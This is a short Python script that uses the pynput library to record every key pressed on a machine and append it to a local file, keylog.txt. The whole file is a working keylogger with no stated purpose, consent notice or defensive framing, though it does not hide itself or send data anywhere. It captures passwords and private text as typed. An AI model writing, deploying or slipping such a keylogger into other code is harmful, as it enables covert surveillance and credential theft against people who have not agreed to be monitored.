from pynput.keyboard import Key, Listener

# Define the path to the log file
log_file = 'keylog.txt'

# Function to write to the log file
def write_to_log(key):
    with open(log_file, 'a') as f:
        f.write(str(key) + '\n')

# Function to handle key press events
def on_press(key):
    try:
        write_to_log(key)
    except Exception as e:
        print(e)

# Create a listener to monitor key presses
with Listener(on_press=on_press) as listener:
    listener.join()